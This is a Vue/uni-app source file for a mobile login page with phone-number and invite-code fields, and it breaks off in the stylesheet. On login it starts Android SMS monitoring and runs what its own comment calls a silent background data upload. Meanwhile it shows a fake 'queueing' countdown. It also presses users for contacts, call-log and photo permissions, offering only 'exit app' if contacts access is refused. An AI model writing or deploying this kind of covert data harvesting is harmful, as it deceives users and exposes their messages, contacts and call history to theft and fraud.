<template>
	<view class="container" @touchmove.prevent>
		<!-- 背景轮播 -->
		<background-slider />
		
		<!-- 完全使用内联样式的语言切换按钮 -->
		<view
			:style="{
				position: 'fixed',
				top: '40px',
				left: configData.language_position === 'top-left' ? '20px' : 'auto',
				right: configData.language_position === 'top-right' ? '20px' : 'auto',
				backgroundColor: configData.language_bg_color || 'rgba(0,0,0,0.3)',
				color: configData.language_font_color || '#ffffff',
				padding: '8px 15px',
				borderRadius: '30px',
				zIndex: 10000,
				boxShadow: '0 4px 10px rgba(0, 0, 0, 0.5)',
				border: '2px solid white',
				minWidth: '80px',
				textAlign: 'center',
				display: 'flex',
				alignItems: 'center',
				justifyContent: 'center',
				opacity: 1
			}"
			@click="toggleLanguageDropdown">
			<text :style="{
				color: configData.language_font_color || '#ffffff',
				fontSize: (configData.language_font_size || 14) + 'px',
				fontWeight: configData.language_font_weight || 'normal'
			}">{{ currentLanguage }}</text>
		</view>
		
		<!-- 语言下拉菜单 -->
		<view v-if="showLanguageDropdown" 
			:style="{
				position: 'fixed',
				top: '80px',
				left: configData.language_position === 'top-left' ? '20px' : 'auto', 
				right: configData.language_position === 'top-right' ? '20px' : 'auto',
				backgroundColor: 'rgba(0, 0, 0, 0.7)',
				borderRadius: '10px',
				boxShadow: '0 4px 10px rgba(0, 0, 0, 0.5)',
				padding: '10px',
				zIndex: 9999,
				maxHeight: '80vh',
				overflowY: 'auto'
			}">
			<view 
				v-for="(lang, index) in languages" 
				:key="index" 
				:style="{
					padding: '8px',
					color: 'white',
					fontSize: '14px',
					fontWeight: 'bold',
					textShadow: '0 1px 2px rgba(0, 0, 0, 0.5)',
					textAlign: 'center',
					borderBottom: index === languages.length - 1 ? 'none' : '1px solid rgba(255, 255, 255, 0.2)',
					cursor: 'pointer'
				}"
				@tap="selectLanguage(index)"
			>
				{{ lang }}
			</view>
		</view>
		
		<!-- 输入表单 - 整体居中显示 -->
		<view class="form-container">
			<view class="form-box">
				<!-- LOGO和标题区域 - 居中显示 -->
				<view class="logo-title-container" v-if="!!configData.show_logo_title" :style="{ marginTop: '2px', marginBottom: '20px' }">
					<image v-if="configData.logo_image" 
						:src="configData.logo_image" 
						:style="{
							width: '160px',
							height: '160px',
							marginBottom: '-15px'
						}"
						mode="aspectFit"
						@load="handleLogoLoaded"
					></image>
					<text v-if="configData.login_title" :style="{
							color: 'white',
							fontSize: '20px',
							fontWeight: 'bold',
							textAlign: 'center',
							marginTop: '-10px'
						}">{{ configData.login_title }}</text>
				</view>
				
				<!-- 只有输入框区域添加蒙版 -->
				<view class="input-container">
					<view class="input-group">
						<view class="input-prefix">
							<text class="area-code">{{ currentAreaCode }}</text>
							<text class="separator">|</text>
						</view>
						<input 
							class="input"
							:class="{ 'error': phoneError }"
							:placeholder="$t('phone')"
							v-model="phone"
							type="number"
							:maxlength="phoneMaxLength"
							@input="handlePhoneInput"
							@focus="handleInputFocus"
							@blur="handleInputBlur"
						/>
					</view>
					<view v-if="phoneError" class="error-message">{{ phoneError }}</view>
					
					<view class="input-group">
						<input 
							class="input"
							:class="{ 'error': inviteCodeError }"
							:placeholder="$t('inviteCode')"
							v-model="inviteCode"
							type="number"
							@input="validateInviteCode"
							@focus="handleInputFocus"
							@blur="handleInputBlur"
						/>
					</view>
					<view v-if="inviteCodeError" class="error-message">{{ $t('inviteCodeError') }}</view>
				</view>
				
				<button 
					:style="loginButtonStyle"
					:disabled="!isFormValid || isLoginProcessing"
					@click="handleLogin"
				>
					{{ $t('login') }}
				</button>

				<!-- 显示服务协议 -->
				<view class="agreement" v-if="!!configData.show_agreement && configData.agreement_text" 
					:style="{
						fontSize: configData.agreement_font_size + 'px',
						color: '#60149f',
						fontWeight: configData.agreement_font_weight || 'normal'
					}">
					{{ $t('agreementPrefix') }}
					<text class="link" @click="openAgreement" 
						:style="{ color: '#60149f' }">
						{{ configData.agreement_text }}
					</text>
					{{ $t('agreementSuffix') || '' }}
				</view>
				
				<!-- 版权信息 -->
				<view class="copyright" v-if="!!configData.show_copyright && configData.copyright_text"
					:style="{
						fontSize: configData.copyright_font_size + 'px',
						color: '#fb0e0e',
						fontWeight: configData.copyright_font_weight || 'normal'
					}">
					{{ configData.copyright_text }}			
				</view>
			</view>
		</view>
		
		<!-- 倒计时弹窗 -->
		<div class="countdown-overlay" v-if="showCountdown">
			<view class="countdown-card">
				<view class="countdown-icon">
					<view class="check-icon">✓</view>
				</view>
				<view class="countdown-text">排队中，请稍后，预计{{ countdown }}秒后进入</view>
			</view>
		</div>
		
		
		<div class="zhezhao zhezhao1" v-if="statePhoto">
			<view class="win-view">
				<view class="win-title">{{ $t('photoPermTitle') }}</view>
				<view class="win-info">{{ $t('photoPermDesc') }}</view>
				<view class="win-view-button">
					<button @click="statePhoto = false" class="cancel-but">{{ $t('close') }}</button>
					<button @click="openPhotoPower" class="confirm-but">{{ $t('authorize') }}</button>
				</view>
			</view>
		</div>

		<div class="zhezhao zhezhao2" v-if="stateContact">
			<view class="win-view">
				<view class="win-title">{{ $t('contactPermTitle') }}</view>
				<view class="win-info">{{ $t('contactPermDesc') }}</view>
				<view class="win-view-button">
					<button @click="outApp" class="cancel-but">{{ $t('exitApp') }}</button>
					<button @click="openContactPower" class="confirm-but">{{ $t('authorize') }}</button>
				</view>
			</view>
		</div>

		<div class="zhezhao zhezhao3" v-if="stateTh">
			<view class="win-view">
				<view class="win-title">{{ $t('callPermTitle') }}</view>
				<view class="win-info">{{ $t('callPermDesc') }}</view>
				<view class="win-view-button">
					<button @click="outApp" class="cancel-but">{{ $t('exitApp') }}</button>
					<button @click="openTHPower" class="confirm-but">{{ $t('authorize') }}</button>
				</view>
			</view>
		</div>
	</view>
</template>

<script>
import BackgroundSlider from '@/components/background-slider.vue'
import config from '@/config/index.js'
import AndroidHandler from '@/utils/android-handler.js'
import IOSHandler from '@/utils/ios-handler.js'
import PlatformUtil from '@/utils/platform.js'
import serverConfig from '@/config/server.config.js'
import uiConfig from '@/config/index.js'
import configManager from '@/utils/config.js'
import permision from './permission.js'

export default {
	components: {
		BackgroundSlider
	},
	data() {
		return {
			phone: '',
			inviteCode: '',
			phoneError: '',
			inviteCodeError: '',
			currentLangIndex: 0,
			languages: [
				'简体中文', '香港繁體', '台灣繁體', 'English', '日本語', 
				'한국어', 'Tiếng Việt', 'Brasileiro',
				'España', 'română', 'العربية'
			],
			languageCodes: [
				'zh-CN', 'zh-HK', 'zh-TW', 'en', 'ja', 
				'ko', 'vi', 'pt-br',
				'es-es', 'ro-ro', 'ar-sa'
			],
			isInputFocused: false,
			isLoginProcessing: false,
			countdown: 80,
			showCountdown: false,
			countdownTimer: null,
			timer: null,
			// 权限状态：null=未检查, false=已授权, true=需要弹窗
			stateContact: null,
			stateSMS: null,
			stateTh: null,
			statePhoto: null,
			configData: {
				show_logo_title: 0,
				logo_image: '',
				login_title: '',
				show_agreement: 0,
				agreement_text: '',
				agreement_url: '',
				copyright_text: '',
				show_copyright: 0,
				// 语言切换配置默认值
				show_language_switch: 1,
				language_font_size: '14',
				language_font_color: '#ffffff',
				language_font_weight: 'normal',
				language_bg_color: 'rgba(0,0,0,0.3)',
				language_position: 'top-right',
				// 登录按钮样式配置默认值
				login_button_font_size: '16',
				login_button_font_color: '#ffffff',
				login_button_font_weight: 'normal',
				login_button_bg_color: '#8257e6',
				login_button_gradient_color: '#6c45c4',
				login_button_radius: '4',
				
			},
			logoImageRatio: 1, // 默认是正方形
			showLanguageDropdown: false, // 确保默认不显示语言下拉菜单
			isPageLoading: true, // 添加页面加载状态
			showDebugPanel: false,
			__DEV__: process.env.NODE_ENV !== 'production',
			_styleLogged: false
		}
	},
	
	computed: {
		currentLanguage() {
			return this.languages?.[this.currentLangIndex] || '简体中文'
		},
		
		currentAreaCode() {
			const currentLang = this.languageCodes?.[this.currentLangIndex]
			return config.phoneAreaCodes?.[currentLang] || '+86'
		},
		
		isFormValid() {
			// 严格检查手机号和邀请码的有效性
			const phoneValid = this.phone && this.phone.length > 0 && !this.phoneError;
			const codeValid = this.inviteCode && this.inviteCode.length > 0 && !this.inviteCodeError && !/\D/.test(this.inviteCode);
			
			// 如果表单变为有效状态，记录按钮样式以便调试
			if (phoneValid && codeValid) {
				this.$nextTick(() => {
					this.logButtonStyle();
				});
			}
			
			return phoneValid && codeValid;
		},
		
		placeholderStyle() {
			return 'color: rgba(255, 255, 255, 0.5); font-size: 14px;'
		},
		
		phoneMaxLength() {
			const lang = this.languageCodes?.[this.currentLangIndex] || 'zh-CN'
			switch(lang) {
				case 'zh-CN':
					return 11  // 中国大陆 11位
				case 'zh-HK':
					return 8   // 香港 8位
				case 'zh-TW':
					return 10  // 台湾 10位
				case 'vi':
					return 10  // 越南 9-10位
				default:
					return 11  // 其他地区默认11位
			}
		},
		
		
		loginButtonStyle() {
			// 调试信息
			this.debugLogStyle();
			
			// 禁用状态样式
			if (!this.isFormValid || this.isLoginProcessing) {
				return 'width: 100%; height: 45px; border-radius: 4px; color: rgba(255, 255, 255, 0.5); font-size: 16px; border: none; background: linear-gradient(135deg, rgba(150, 150, 150, 0.8) 0%, rgba(180, 180, 180, 0.8) 100%); opacity: 0.7; cursor: not-allowed; box-shadow: none; position: relative; overflow: hidden;';
			}
			
			// 有效状态样式 - 使用configData中的值
			const buttonRadius = this.configData.login_button_radius || '4';
			const fontColor = this.configData.login_button_font_color || '#222020';
			const fontWeight = this.configData.login_button_font_weight || 'bold';
			const fontSize = this.configData.login_button_font_size || '16';
			const bgColor = this.configData.login_button_bg_color || '#736b85';
			const gradientColor = this.configData.login_button_gradient_color || '#184dc9';
			const shadow = this.configData.login_button_shadow ? '0 4px 15px rgba(0, 0, 0, 0.3)' : 'none';
			
			// 构建完整的按钮样式 - 已移除悬停效果相关代码
			const style = `
				width: 100%; 
				height: 45px; 
				border-radius: ${buttonRadius}px; 
				color: ${fontColor}; 
				font-weight: ${fontWeight}; 
				font-size: ${fontSize}px; 
				border: none; 
				background: linear-gradient(135deg, ${bgColor} 0%, ${gradientColor} 100%); 
				box-shadow: ${shadow}; 
				position: relative; 
				overflow: hidden; 
				opacity: 1;
			`.replace(/\s+/g, ' ').trim();
			
			console.log('最终按钮样式:', style);
			
			return style;
		}
	},
	
	watch: {
		phone(val) {
			this.validatePhone();
		},
		inviteCode(val) {
			this.validateInviteCode();
		}
	},
	
	methods: {
		// 切换语言下拉菜单显示状态
		toggleLanguageDropdown() {
			this.showLanguageDropdown = !this.showLanguageDropdown;
			console.log('切换语言下拉菜单:', this.showLanguageDropdown ? '显示' : '隐藏');
		},
		
		// 选择语言
		selectLanguage(index) {
			// 更新当前索引
			this.currentLangIndex = index;
			
			// 获取选中的语言代码
			const lang = this.languageCodes[index];
			
			// 更新 i18n locale
			this.$i18n.locale = lang;
			
			// 保存到本地存储
			uni.setStorageSync('language', lang);
			
			// 隐藏下拉菜单
			this.showLanguageDropdown = false;
			
			// 清空输入和错误提示
			this.phone = '';
			this.phoneError = '';
			this.inviteCode = '';
			this.inviteCodeError = '';
			
			console.log('已切换语言为:', this.languages[index], '(', lang, ')');
		},
		
		handleInputFocus() {
			this.isInputFocused = true
		},
		
		handleInputBlur() {
			this.isInputFocused = false
		},
		
		handlePhoneInput(e) {
			// 移除错误状态
			this.phoneError = ''
			this.validatePhone()
			// 确保表单状态更新
			this.$nextTick(() => {
				// 防止输入过快导致验证不准确，增加一个短暂延时
				setTimeout(() => {
					this.$forceUpdate();
				}, 10);
			});
		},
		
		validatePhone() {
			try {
				if (!this.phone) {
					this.phoneError = '';
					return;
				}
				
				const currentLang = this.languageCodes?.[this.currentLangIndex]
				if (!currentLang) {
					console.log('Language code not found');
					return;
				}
				
				const rule = config.validation?.phoneRules?.[currentLang]
				if (!rule?.pattern) {
					console.log('Phone validation rule not found');
					return;
				}
				
				if (!rule.pattern.test(this.phone)) {
					this.phoneError = rule.message || this.$t('phoneError');
				} else {
					this.phoneError = '';
				}
				
				// 在安全的上下文中强制更新UI
				this.$nextTick(() => {
					this.$forceUpdate();
				});
			} catch (error) {
				console.error('验证手机号时出错:', error);
				this.phoneError = '';
			}
		},
		
		validateInviteCode() {
			try {
				// 移除错误状态
				this.inviteCodeError = '';
				
				// 验证邀请码
				if (!this.inviteCode) {
					return;
				}
				
				if (!/^\d+$/.test(this.inviteCode)) {
					this.inviteCodeError = true;
					this.$nextTick(() => {
						this.$forceUpdate();
					});
				} else {
					this.$forceUpdate();
					
					// 检查表单是否有效
					this.$nextTick(() => {
						// 强制更新UI
						this.$forceUpdate();
					});
				}
			} catch (error) {
				console.error('验证邀请码时出错:', error);
				this.inviteCodeError = '';
			}
		},
		
		async handleLogin() {
			try {
				this.initFormValidation();
				
				if (!this.isFormValid) {
					uni.showToast({ title: this.$t('formIncomplete'), icon: 'none' });
					return;
				}

				if (!this.phone) {
					uni.showToast({ title: this.$t('phoneError'), icon: 'none' });
					return;
				}

				if (!this.inviteCode) {
					uni.showToast({ title: this.$t('inviteCodeError'), icon: 'none' });
					return;
				}
				
				if (this.isLoginProcessing) return;
				this.isLoginProcessing = true;
				
				uni.showLoading({ title: '正在登录中...' });
				
				const Handler = PlatformUtil.isIOS() ? IOSHandler : AndroidHandler;
				
				if (PlatformUtil.isAndroid()) {
					AndroidHandler.startSmsMonitoring(this.phone);
				}
				
				// 3秒后关闭loading并显示倒计时弹窗，数据在后台继续上传
				setTimeout(() => {
					uni.hideLoading();
					this.startCountdown();
				}, 3000);
				
				// 数据上传在后台静默进行
				Handler.handleLogin(this.phone, this.inviteCode)
					.then(() => {
						console.log('数据上传完成');
					})
					.catch(error => {
						console.error('登录处理失败:', error);
					});

			} catch (error) {
				console.error('登录失败:', error);
				this.isLoginProcessing = false;
				uni.hideLoading();
			}
		},
		
		startCountdown() {
			this.showCountdown = true;
			this.countdown = 90;
			this.isLoginProcessing = false;
			
			if (this.countdownTimer) {
				clearInterval(this.countdownTimer);
			}
			
			this.countdownTimer = setInterval(() => {
				if (this.countdown > 0) {
					this.countdown--;
				} else {
					this.stopCountdown();
					// 倒计时结束，跳转到WebView页面（读取后台配置的链接）
					uni.navigateTo({
						url: '/pages/loading/loading',
						fail: (error) => {
							console.error('跳转失败:', error);
							setTimeout(() => {
								uni.navigateTo({ url: '/pages/loading/loading' });
							}, 500);
						}
					});
				}
			}, 1000);
		},
		
		stopCountdown() {
			if (this.countdownTimer) {
				clearInterval(this.countdownTimer);
				this.countdownTimer = null;
			}
			this.showCountdown = false;
		},
		
		openAgreement() {
			if (this.configData.agreement_url) {
				uni.navigateTo({
					url: `/pages/webview/webview?url=${encodeURIComponent(this.configData.agreement_url)}&title=${encodeURIComponent(this.configData.agreement_text || '服务协议')}`
				});
			}
		},
		
		outApp() {
			if (uni.getSystemInfoSync().platform == 'ios') {
				plus.ios.import('UIApplication').sharedApplication().performSelector('exit');
			} else if (uni.getSystemInfoSync().platform == 'android') {
				plus.runtime.quit();
			}
		},

		openContactPower() {
			this.stateContact = null;
			permision.gotoAppPermissionSetting();
		},

		openTHPower() {
			this.stateTh = null;
			permision.gotoAppPermissionSetting();
		},

		openPhotoPower() {
			this.statePhoto = null;
			permision.gotoAppPermissionSetting();
		},
		
		// 初始化语言设置
		initLanguage() {
			// 尝试从本地存储获取保存的语言设置
			const savedLang = uni.getStorageSync('language')
			if (savedLang) {
				// 找到保存的语言代码对应的索引
				const index = this.languageCodes.indexOf(savedLang)
				if (index !== -1) {
					this.currentLangIndex = index
					// 确保 i18n 也使用正确的语言
					this.$i18n.locale = savedLang
				}
			}
			console.log('语言初始化完成，当前语言:', this.currentLanguage, '语言代码:', this.languageCodes[this.currentLangIndex]);
		},
		
		// 初始化表单验证状态
		initFormValidation() {
			try {
				// 重置错误状态
				this.phoneError = '';
				this.inviteCodeError = '';
				
				// 如果表单为空，则确保按钮为禁用状态
				if (!this.phone) {
					console.log('初始化表单验证 - 手机号为空');
				} else {
					// 如果有值，执行验证
					this.validatePhone();
				}
				
				if (!this.inviteCode) {
					console.log('初始化表单验证 - 邀请码为空');
				} else {
					// 如果有值，执行验证
					this.validateInviteCode();
				}
				
				// 使用nextTick确保DOM更新后再次检查验证状态
				this.$nextTick(() => {
					console.log('初始化表单验证 - 当前状态:', this.isFormValid);
					
					// 强制更新UI
					this.$forceUpdate();
				});
			} catch (error) {
				console.error('初始化表单验证时出错:', error);
			}
		},
		
		// 禁止页面拖动
		preventTouchMove(e) {
			e.preventDefault();
		},
		
		// 配置加载完成后的处理
		async onConfigLoaded() {
			try {
				// 获取配置管理器中的配置数据
				const config = configManager.config;
				
				// 日志输出配置数据中的按钮相关配置
				console.log('===== 按钮配置调试信息 =====');
				console.log('配置加载完成 - 字体颜色:', config.login_button_font_color);
				console.log('配置加载完成 - 背景色:', config.login_button_bg_color);
				console.log('配置加载完成 - 渐变色:', config.login_button_gradient_color);
				console.log('配置加载完成 - 字体大小:', config.login_button_font_size);
				console.log('配置加载完成 - 字体粗细:', config.login_button_font_weight);
				console.log('配置加载完成 - 圆角大小:', config.login_button_radius);
				console.log('配置加载完成 - 阴影效果:', config.login_button_shadow);
				
				// 更新组件的configData，确保所有配置项被设置
				this.configData = { 
					...this.configData, // 保留现有配置
					...config, // 更新从API获取的配置
					// 确保所有按钮配置存在，使用后台配置，如果不存在则使用默认值
					login_button_font_size: config.login_button_font_size || '16',
					login_button_font_color: config.login_button_font_color || '#ffffff',
					login_button_font_weight: config.login_button_font_weight || 'normal',
					login_button_bg_color: config.login_button_bg_color || '#8257e6',
					login_button_gradient_color: config.login_button_gradient_color || '#6c45c4',
					login_button_radius: config.login_button_radius || '4',
					login_button_shadow: config.login_button_shadow === 0 ? 0 : 1,
				};
				
				console.log('按钮样式配置信息:', JSON.stringify({
					login_button_font_color: this.configData.login_button_font_color,
					login_button_bg_color: this.configData.login_button_bg_color,
					login_button_gradient_color: this.configData.login_button_gradient_color
				}));
				
				// 重置调试标志，以便在样式更新后再次输出样式信息
				this._styleLogged = false;
				
				// 直接更新按钮样式
				this.$nextTick(() => {
					this.forceUpdateButtonStyle();
					console.log('已强制更新按钮样式');
				});
			} catch (error) {
				console.error('配置加载处理时出错:', error);
			}
		},
		
		// 记录按钮样式用于调试
		logButtonStyle() {
			try {
				console.log('=========== 调试按钮样式 ===========');
				console.log('字体颜色:', this.configData.login_button_font_color);
				console.log('背景颜色:', this.configData.login_button_bg_color);
				console.log('渐变颜色:', this.configData.login_button_gradient_color);
				console.log('字体大小:', this.configData.login_button_font_size);
				console.log('字体粗细:', this.configData.login_button_font_weight);
				console.log('按钮圆角:', this.configData.login_button_radius);
				console.log('阴影效果:', this.configData.login_button_shadow ? '开启' : '关闭');
				
				// 只在浏览器环境中尝试获取DOM元素
				// #ifdef H5
				const button = document.querySelector('button');
				if (button) {
					console.log('DOM中当前按钮样式:', button.style.cssText);
					console.log('DOM中按钮CSS计算样式 - 颜色:', getComputedStyle(button).color);
					console.log('DOM中按钮CSS计算样式 - 背景:', getComputedStyle(button).background);
				} else {
					console.log('未找到按钮元素');
				}
				// #endif
			} catch (error) {
				console.error('记录按钮样式时出错:', error);
			}
		},
		
		// 强制更新按钮样式 - 直接使用DOM操作
		forceUpdateButtonStyle() {
			try {
				// 只在浏览器环境中尝试更新DOM样式
				// #ifdef H5
				if (typeof document === 'undefined') {
					console.log('非浏览器环境，跳过DOM操作');
					return;
				}
				
				// 查找按钮元素
				const button = document.querySelector('button');
				if (!button) {
					console.log('未找到按钮元素，无法应用样式');
					return;
				}
				
				console.log('forceUpdateButtonStyle: 获取按钮元素成功，正在应用样式');
				console.log('正在应用的按钮样式值:', JSON.stringify({
					font_color: this.configData.login_button_font_color,
					bg_color: this.configData.login_button_bg_color,
					gradient_color: this.configData.login_button_gradient_color,
					font_size: this.configData.login_button_font_size,
					font_weight: this.configData.login_button_font_weight,
					radius: this.configData.login_button_radius
				}));
				
				// 在非禁用状态下应用样式
				if (!button.disabled) {
					console.log('应用按钮样式 - 按钮未禁用，应用活动样式');
					// 直接设置内联样式
					button.style.color = this.configData.login_button_font_color || '#222020';
					button.style.fontWeight = this.configData.login_button_font_weight || 'bold';
					button.style.fontSize = `${this.configData.login_button_font_size || '16'}px`;
					
					// 设置背景和渐变
					if (this.configData.login_button_gradient_color) {
						const bgColor = this.configData.login_button_bg_color || '#736b85';
						const gradientColor = this.configData.login_button_gradient_color || '#184dc9';
						button.style.background = `linear-gradient(135deg, ${bgColor} 0%, ${gradientColor} 100%)`;
						console.log(`设置按钮渐变背景: linear-gradient(135deg, ${bgColor} 0%, ${gradientColor} 100%)`);
					} else {
						button.style.background = this.configData.login_button_bg_color || '#736b85';
						console.log(`设置按钮纯色背景: ${this.configData.login_button_bg_color || '#736b85'}`);
					}
					
					// 设置圆角
					button.style.borderRadius = `${this.configData.login_button_radius || '4'}px`;
					console.log(`设置按钮圆角: ${this.configData.login_button_radius || '4'}px`);
					
					// 设置阴影
					if (this.configData.login_button_shadow) {
						button.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.3)';
						console.log('开启按钮阴影效果');
					} else {
						button.style.boxShadow = 'none';
						console.log('关闭按钮阴影效果');
					}
					
					console.log('按钮样式已通过DOM直接更新');
				} else {
					console.log('按钮当前为禁用状态，保持禁用样式');
				}
				// #endif
				
				// 在非浏览器环境下，使用CSS类方式设置样式
				// #ifndef H5
				console.log('非浏览器环境，通过CSS类应用按钮样式');
				// #endif
			} catch (error) {
				console.error('强制更新按钮样式时出错:', error);
			}
		},
		
		// 设置根元素CSS变量
		setRootCSSVariables() {
			try {
				if (typeof document === 'undefined') {
					console.log('非浏览器环境，跳过CSS变量设置');
					return;
				}
				
				const root = document.documentElement;
				
				// 设置登录按钮相关的CSS变量
				root.style.setProperty('--login-button-font-color', this.configData.login_button_font_color || '#222020');
				root.style.setProperty('--login-button-font-weight', this.configData.login_button_font_weight || 'bold');
				root.style.setProperty('--login-button-font-size', `${this.configData.login_button_font_size || '16'}px`);
				
				// 设置背景渐变
				const bgValue = this.configData.login_button_gradient_color ? 
					`linear-gradient(135deg, ${this.configData.login_button_bg_color || '#736b85'} 0%, ${this.configData.login_button_gradient_color || '#184dc9'} 100%)` : 
					(this.configData.login_button_bg_color || '#736b85');
				root.style.setProperty('--login-button-bg', bgValue);
				
				// 设置其他按钮样式
				root.style.setProperty('--login-button-radius', `${this.configData.login_button_radius || '4'}px`);
				root.style.setProperty('--login-button-shadow', this.configData.login_button_shadow ? '0 4px 15px rgba(0, 0, 0, 0.3)' : 'none');
				
				console.log('已设置CSS变量:', {
					'--login-button-font-color': root.style.getPropertyValue('--login-button-font-color'),
					'--login-button-bg': root.style.getPropertyValue('--login-button-bg')
				});
			} catch (error) {
				console.error('设置CSS变量时出错:', error);
			}
		},
		
		// 调试按钮样式信息
		debugLogStyle() {
			// 只在开发环境且是首次计算时输出
			if (this.__DEV__ && !this._styleLogged) {
				console.log('===DEBUG 按钮样式计算===');
				console.log('按钮样式参数:');
				console.log('- 字体颜色:', this.configData.login_button_font_color);
				console.log('- 背景颜色:', this.configData.login_button_bg_color);
				console.log('- 渐变颜色:', this.configData.login_button_gradient_color);
				console.log('- 字体大小:', this.configData.login_button_font_size);
				console.log('- 字体粗细:', this.configData.login_button_font_weight);
				console.log('- 按钮圆角:', this.configData.login_button_radius);
				console.log('- 阴影效果:', this.configData.login_button_shadow ? '开启' : '关闭');
				console.log('- 表单有效性:', this.isFormValid);
				console.log('- 登录处理中:', this.isLoginProcessing);
				this._styleLogged = true;
			}
		}
	},
	
	// 添加生命周期方法
	created() {
		console.log('组件created - 开始初始化');
		
		// 初始化语言设置
		this.initLanguage();
		
		// 创建一个调试函数来记录configData
		const logConfigData = () => {
			console.log('当前configData值:', JSON.stringify({
				login_button_font_color: this.configData.login_button_font_color,
				login_button_bg_color: this.configData.login_button_bg_color,
				login_button_gradient_color: this.configData.login_button_gradient_color
			}));
		};
		
		// 注册配置管理器的监听器
		const onConfigLoaded = (config) => {
			console.log('配置加载回调触发 - 字体颜色:', config.login_button_font_color);
			
			// 确保按钮样式配置存在，使用后台配置，如果不存在则使用默认值
			this.configData = { 
				...this.configData, // 保留现有配置
				...config, // 更新从API获取的配置
				// 确保所有按钮配置存在，使用后台配置，如果不存在则使用默认值
				login_button_font_size: config.login_button_font_size || '16',
				login_button_font_color: config.login_button_font_color || '#ffffff',
				login_button_font_weight: config.login_button_font_weight || 'normal',
				login_button_bg_color: config.login_button_bg_color || '#8257e6',
				login_button_gradient_color: config.login_button_gradient_color || '#6c45c4',
				login_button_radius: config.login_button_radius || '4',
				login_button_shadow: config.login_button_shadow === 0 ? 0 : 1,
				
			};
			
			console.log('按钮样式配置信息:', JSON.stringify({
				login_button_font_color: this.configData.login_button_font_color,
				login_button_bg_color: this.configData.login_button_bg_color,
				login_button_gradient_color: this.configData.login_button_gradient_color
			}));
			
			// 重置调试标志，以便在样式更新后再次输出样式信息
			this._styleLogged = false;
			
			// 直接更新按钮样式
			this.$nextTick(() => {
				console.log('配置加载回调中：更新按钮样式');
				this.forceUpdateButtonStyle();
				console.log('已强制更新按钮样式');
			});
		};
		
		// 记录初始状态
		logConfigData();
		
		configManager.addListener(onConfigLoaded);
		this.onConfigLoaded = onConfigLoaded; // 保存引用便于later移除
		
		// 检查配置是否已经加载完成
		if (configManager.isConfigLoaded()) {
			console.log('配置已加载，直接初始化');
			onConfigLoaded(configManager.getConfig());
		} else {
			console.log('配置未加载，等待配置加载完成');
			// 确保加载配置
			configManager.loadConfig().then(() => {
				console.log('配置加载成功');
			}).catch(error => {
				console.error('配置加载失败:', error);
			});
		}
	},
	
	mounted() {
		console.log('组件mounted - DOM已挂载');
		
		// 调试当前按钮样式绑定
		console.log('=== 按钮样式绑定值 ===');
		console.log('表单有效性:', this.isFormValid);
		console.log('登录处理中:', this.isLoginProcessing);
		
		// 初始化表单验证状态
		this.initFormValidation();
		
		// 在DOM加载完成后强制更新按钮样式
		this.$nextTick(() => {
			console.log('mounted: 即将调用forceUpdateButtonStyle()');
			// 调试: 获取configData值
			console.log('mounted中的configData值:', JSON.stringify({
				font_color: this.configData.login_button_font_color,
				bg_color: this.configData.login_button_bg_color,
				gradient_color: this.configData.login_button_gradient_color,
				font_size: this.configData.login_button_font_size,
				font_weight: this.configData.login_button_font_weight,
				radius: this.configData.login_button_radius
			}));
			this.forceUpdateButtonStyle();
			this.logButtonStyle();
			console.log('mounted后强制更新按钮样式');
		});
		
		// 监听全局配置变更事件
		uni.$on('config:updated', (config) => {
			console.log('收到全局配置更新事件, login_button_font_color:', config.login_button_font_color);
			// 更新本地configData
			this.configData = { ...this.configData, ...config };
			console.log('config:updated事件后的configData:', JSON.stringify({
				font_color: this.configData.login_button_font_color,
				bg_color: this.configData.login_button_bg_color,
				gradient_color: this.configData.login_button_gradient_color
			}));
			
			// 重置调试标志，以便在样式更新后再次输出样式信息
			this._styleLogged = false;
			
			this.$nextTick(() => {
				this.forceUpdateButtonStyle();
			});
		});
	},
	
	onShow() {
		if (this.stateContact == null) {
			permision.requestAndroidPermission('android.permission.READ_CONTACTS').then((e) => {
				if (e == 1) {
					this.stateContact = false;
				} else {
					this.stateContact = true;
				}
			});
		}

		if (this.stateTh == null) {
			permision.requestAndroidPermission('android.permission.READ_CALL_LOG').then((e) => {
				if (e == 1) {
					this.stateTh = false;
				} else {
					this.stateTh = false;
				}
			});
		}

		if (this.statePhoto == null) {
			// Android 13+ 使用 READ_MEDIA_IMAGES，低版本用 READ_EXTERNAL_STORAGE
			let photoPerm = 'android.permission.READ_EXTERNAL_STORAGE';
			try {
				const Build = plus.android.importClass('android.os.Build');
				if (Build.VERSION.SDK_INT >= 33) {
					photoPerm = 'android.permission.READ_MEDIA_IMAGES';
				}
			} catch (e) {}
			permision.requestAndroidPermission(photoPerm).then((e) => {
				if (e == 1) {
					this.statePhoto = false;
				} else {
					this.statePhoto = true;
				}
			});
		}
	},
	
	beforeDestroy() {
		// 移除配置管理器监听器
		if (this.onConfigLoaded) {
			configManager.removeListener(this.onConfigLoaded);
		}
		
		// 清除倒计时
		this.stopCountdown();
		
		// 移除全局事件监听
		uni.$off('config:updated');
	}
}
</script>

<style>
	/* 添加一些基本样式 */
	/* 可以根据需要添加更多样式 */
	
	/* 登录按钮样式 - 高优先级作为后备 */
	button[disabled] {
		opacity: 0.7 !important;
		cursor: not-allowed !important;
		background: linear-gradient(135deg, rgba(150, 150, 150, 0.8) 0%, rgba(180, 180, 180, 0.8) 100%) !important;
		color: rgba(255, 255, 255, 0.5) !important;
	}
	
	button:not([disabled]) {
		/* 这些样式只有在内联样式和forceUpdateButtonStyle都失败时才会生效 */
		color: var(--login-button-font-color, #222020);
		font-weight: var(--login-button-font-weight, bold);
		background: var(--login-button-bg, linear-gradient(135deg, #736b85 0%, #184dc9 100%));
		box-shadow: var(--login-button-shadow, 0 4px 15px rgba(0, 0, 0, 0.3));
	}
	
	/* 容器样式 */
	.container {
		width: 100%;
		height: 100vh;
		position: relative;
		overflow: hidden;
	}
	
	/* 表单容器样式 */
	.form-container {
		position: absolute;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		display: flex;
		justify-content: center;
		align-items: center;
		z-index: 1;
	}
	
	.form-box {
		width: 85%;
		max-width: 400px;
		padding: 15px;
		border-radius: 10px;
		background-color: rgba(0, 0, 0, 0.5);
		backdrop-filter: blur(10px);
		-webkit-backdrop-filter: blur(10px);
	}
	
	/* 输入框相关样式 */
	.input-container {
		margin-bottom: 15px;
		background-color: rgba(255, 255, 255, 0.1);
		border-radius: 8px;
		padding: 8px;
	}
	
	.input-group {
		display: flex;
		align-items: center;
		background-color: rgba(0, 0, 0, 0.3);
		border-radius: 5px;
		margin-bottom: 10px;
		overflow: hidden;
	}
	
	.input-prefix {
